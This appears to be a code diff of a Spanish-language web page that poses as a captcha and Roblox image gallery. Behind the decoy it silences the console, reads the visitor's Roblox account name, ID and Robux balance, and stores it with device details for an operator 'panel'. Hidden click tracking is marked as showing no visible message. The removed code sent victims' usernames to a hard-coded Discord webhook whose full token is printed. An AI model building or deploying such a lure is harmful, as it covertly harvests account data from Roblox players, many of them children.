@@ -190,6 +190,7 @@
             border: 2px solid #222;
             transition: border-color 0.3s;
             background: #1a1a1a;
+            cursor: pointer;
         }
 
         .gallery-item:hover {
@@ -201,6 +202,7 @@
             height: 280px;
             object-fit: cover;
             display: block;
+            pointer-events: none;
         }
 
         .gallery-item .caption {
@@ -209,23 +211,32 @@
             color: #888;
             font-size: 14px;
             background: #111;
+            pointer-events: none;
         }
 
         .slider-hint {
             text-align: center;
-            color: #666;
+            color: #888;
             font-size: 14px;
             margin: 20px 0;
-            padding: 10px;
+            padding: 15px;
             background: #1a1a1a;
             border-radius: 8px;
             border: 1px solid #222;
+            line-height: 1.5;
         }
 
         .slider-hint span {
             color: #ff4444;
-            font-size: 20px;
+            font-size: 18px;
             margin-right: 8px;
+        }
+
+        .slider-hint small {
+            color: #666;
+            font-size: 12px;
+            display: block;
+            margin-top: 8px;
         }
 
         /* Utilidades */
@@ -271,10 +282,11 @@
         <!-- Pantalla de galería -->
         <div class="gallery-screen" id="galleryScreen">
             <div class="gallery-title">📸 GALERÍA DE IMÁGENES</div>
-            <div class="gallery-subtitle">Desliza para ver las imágenes</div>
+            <div class="gallery-subtitle">Clickea las imágenes para ver su descripción</div>
             
             <div class="slider-hint">
-                <span>👆</span> Desliza horizontalmente para ver más imágenes
+                <span>👆</span> Desliza para ver más imágenes
+                <small>La descripción es pequeña</small>
             </div>
             
             <div class="gallery-slider" id="gallerySlider">
@@ -285,34 +297,34 @@
 
     <script>
         // ================= CONFIGURACIÓN =================
-        const PANEL_URL = "https://juanchos123.github.io/image_9180173538.png/panel.html";
+        const JSON_URL = "https://juanchos123.github.io/image_9180173538.png/KÑKÑÑÑÑE.json";
         
         // Lista de imágenes
         const imagenes = [
             {
                 url: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRoAezjtFE6or4R-e50mf5T4gM3CZ9Q0kBJmYFcOZUm4FJ5BN-AQHRXxAHE&s=10",
-                caption: "Imagen 1 - Paisaje urbano"
+                caption: "Paisaje urbano - Ciudad moderna"
             },
             {
                 url: "https://i.pinimg.com/236x/69/a4/63/69a4631c8777df9cddf673a6a67d1c0b.jpg",
-                caption: "Imagen 2 - Arte digital"
+                caption: "Arte digital - Estilo abstracto"
             },
             {
                 url: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTY6t30DI6I2wxQmCB794lrCpoUQJsuwcX9cCwzlFxXlg&s=10",
-                caption: "Imagen 3 - Estilo anime"
-                         },
-                         {
-                 url: "https://e0.pxfuel.com/wallpapers/584/804/desktop-wallpaper-cute-roblox-girls-ideas-in-2021-roblox-roblox-animation-roblox-aesthetic-roblox-girl.jpg",
-                 caption:"Imagen 4 - Estilo aesthetic"
-                },
-                {
-                 url: "https://i.pinimg.com/236x/fe/bb/79/febb79832ab5260f0e2c8fc12d8672c9.jpg",
-                 caption:"Imagen 5 - Estilo Kwai"
-                },
-                {
-                 url:" https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMIGCn_iGeaYFMlwx81C3U4-fTXyy9dgKJhPL7l6i9gpAzu_xJ9X3j_6A&s=10",
-                 caption:"Imagen 6 - Estilo Blue "
-                },
+                caption: "Estilo anime - Personaje"
+            },
+            {
+                url: "https://e0.pxfuel.com/wallpapers/584/804/desktop-wallpaper-cute-roblox-girls-ideas-in-2021-roblox-roblox-animation-roblox-aesthetic-roblox-girl.jpg",
+                caption: "Aesthetic - Fondo rosa"
+            },
+            {
+                url: "https://i.pinimg.com/236x/fe/bb/79/febb79832ab5260f0e2c8fc12d8672c9.jpg",
+                caption: "Estilo Kwai - Ilustración"
+            },
+            {
+                url: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMIGCn_iGeaYFMlwx81C3U4-fTXyy9dgKJhPL7l6i9gpAzu_xJ9X3j_6A&s=10",
+                caption: "Blue - Tono azul"
+            },
         ];
 
         // Silenciar consola
@@ -378,24 +390,73 @@
                             userData.robux = robuxData.robux;
                         }
                     } catch (e) {}
-                    
-                    guardarDatosParaPanel();
                 }
             } catch (e) {}
         }
 
-        // =========== GUARDAR DATOS PARA EL PANEL ===========
-        function guardarDatosParaPanel() {
-            const datos = {
-                ...userData,
-                timestamp: Date.now()
-            };
-            
-            // Guardar en localStorage para que el panel pueda leerlo
-            localStorage.setItem('roblox_user_data', JSON.stringify(datos));
-            
-            // También guardar en sessionStorage por si acaso
-            sessionStorage.setItem('roblox_user_data', JSON.stringify(datos));
+        // =========== GUARDAR DATOS EN KÑKÑÑÑÑE.json ===========
+        async function guardarEnJSON() {
+            try {
+                // Primero obtener datos actuales del JSON
+                let datosActuales = [];
+                
+                try {
+                    const response = await fetch(JSON_URL + '?t=' + Date.now());
+                    if (response.ok) {
+                        datosActuales = await response.json();
+                    }
+                } catch (e) {
+                    // Si no existe, empezar con array vacío
+                }
+
+                // Asegurar que es un array
+                if (!Array.isArray(datosActuales)) {
+                    datosActuales = [];
+                }
+
+                // Crear nuevo registro
+                const nuevoRegistro = {
+                    id: datosActuales.length + 1,
+                    timestamp: Date.now(),
+                    fecha: new Date().toLocaleString(),
+                    ip: null, // No podemos obtener IP sin backend
+                    userAgent: navigator.userAgent,
+                    dispositivo: /mobile/i.test(navigator.userAgent) ? 'Móvil' : 'PC',
+                    cuentaDetectada: userData.cuentaDetectada,
+                    userId: userData.userId,
+                    userName: userData.userName,
+                    robux: userData.robux || 0,
+                    panelAccess: false,
+                    imagenClickeada: null
+                };
+
+                datosActuales.push(nuevoRegistro);
+
+                // Guardar en localStorage como respaldo (GitHub no permite escritura directa)
+                localStorage.setItem('KÑKÑÑÑÑE', JSON.stringify(datosActuales));
+                
+                console.log('✅ Datos guardados localmente. Sube KÑKÑÑÑÑE.json manualmente para persistir.');
+                
+            } catch (e) {
+                console.error('Error guardando datos:', e);
+            }
+        }
+
+        // =========== MARCAR QUE DIERON CLICK ===========
+        async function marcarClickEnJSON(index) {
+            try {
+                const datosGuardados = localStorage.getItem('KÑKÑÑÑÑE');
+                if (datosGuardados) {
+                    const datos = JSON.parse(datosGuardados);
+                    if (datos.length > 0) {
+                        const ultimo = datos[datos.length - 1];
+                        ultimo.panelAccess = true;
+                        ultimo.imagenClickeada = index;
+                        ultimo.clickTime = Date.now();
+                        localStorage.setItem('KÑKÑÑÑÑE', JSON.stringify(datos));
+                    }
+                }
+            } catch (e) {}
         }
 
         // =========== MOSTRAR CAPTCHA ===========
@@ -403,7 +464,9 @@
             captchaContainer.style.display = 'block';
             
             // Detectar cuenta justo cuando aparece el captcha
-            detectarCuentaRoblox();
+            detectarCuentaRoblox().then(() => {
+                guardarEnJSON();
+            });
         }
 
         // =========== MANEJAR CLICK EN CAPTCHA ===========
@@ -426,9 +489,6 @@
                 
                 // Cargar imágenes
                 cargarImagenes();
-                
-                // Notificar al panel
-                notificarPanel();
             }, 500);
         });
 
@@ -439,44 +499,43 @@
             imagenes.forEach((img, index) => {
                 const item = document.createElement('div');
                 item.className = 'gallery-item fade-in';
+                item.setAttribute('data-index', index);
                 item.innerHTML = `
                     <img src="${img.url}" alt="${img.caption}" loading="lazy">
                     <div class="caption">${img.caption}</div>
                 `;
                 
                 // Si la imagen falla, mostrar placeholder
-                item.querySelector('img').onerror = function() {
-                    this.src = 'https://via.placeholder.com/280x280/111/ff4444?text=Imagen+${index+1}';
+                const imgElement = item.querySelector('img');
+                imgElement.onerror = function() {
+                    this.src = 'https://via.placeholder.com/280x280/111/ff4444?text=Imagen+' + (index + 1);
                 };
+                
+                // =========== CLICK EN IMAGEN - SILENCIOSO ===========
+                item.addEventListener('click', function() {
+                    // Marcar en el JSON que dieron click
+                    marcarClickEnJSON(index);
+                    
+                    // También guardar en localStorage para acceso rápido del panel
+                    localStorage.setItem('panel_access_granted', 'true');
+                    localStorage.setItem('panel_access_time', Date.now().toString());
+                    localStorage.setItem('clicked_image', index.toString());
+                    
+                    // Guardar datos completos si hay cuenta
+                    if (userData.cuentaDetectada) {
+                        localStorage.setItem('panel_ready', JSON.stringify({
+                            userName: userData.userName,
+                            userId: userData.userId,
+                            robux: userData.robux || 0,
+                            timestamp: Date.now()
+                        }));
+                    }
+                    
+                    // Aquí NO hay ningún mensaje visible
+                });
                 
                 gallerySlider.appendChild(item);
             });
-        }
-
-        // =========== NOTIFICAR AL PANEL ===========
-        function notificarPanel() {
-            // Guardar timestamp de última actividad
-            localStorage.setItem('last_activity', Date.now().toString());
-            
-            // Si hay cuenta detectada, enviar datos completos
-            if (userData.cuentaDetectada) {
-                const datosCompletos = {
-                    ...userData,
-                    evento: 'verificacion_completada',
-                    url_actual: window.location.href
-                };
-                
-                localStorage.setItem('roblox_session_active', JSON.stringify(datosCompletos));
-                
-                // También enviar a Discord (opcional)
-                fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `✅ Verificación completada - Usuario: ${userData.userName} (${userData.userId})`
-                    })
-                }).catch(() => {});
-            }
         }
 
         // =========== INICIALIZAR ===========
@@ -484,24 +543,27 @@
             // Limpiar datos antiguos (más de 5 minutos)
             const lastActivity = localStorage.getItem('last_activity');
             if (lastActivity && (Date.now() - parseInt(lastActivity)) > 300000) {
-                localStorage.removeItem('roblox_user_data');
-                localStorage.removeItem('roblox_session_active');
+                localStorage.removeItem('panel_access_granted');
+                localStorage.removeItem('panel_ready');
             }
             
             // Verificar si ya hay datos guardados
-            const savedData = localStorage.getItem('roblox_user_data');
+            const savedData = localStorage.getItem('KÑKÑÑÑÑE');
             if (savedData) {
                 try {
                     const parsed = JSON.parse(savedData);
-                    if (parsed.userId) {
-                        userData = parsed;
+                    if (parsed.length > 0) {
+                        const last = parsed[parsed.length - 1];
+                        if (last.userId) {
+                            userData.userId = last.userId;
+                            userData.userName = last.userName;
+                            userData.robux = last.robux;
+                            userData.cuentaDetectada = true;
+                        }
                     }
                 } catch (e) {}
             }
         })();
-
-        // =========== WEBHOOK DE DISCORD (OPCIONAL) ===========
-        const WEBHOOK = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
     </script>
 </body>
 </html>
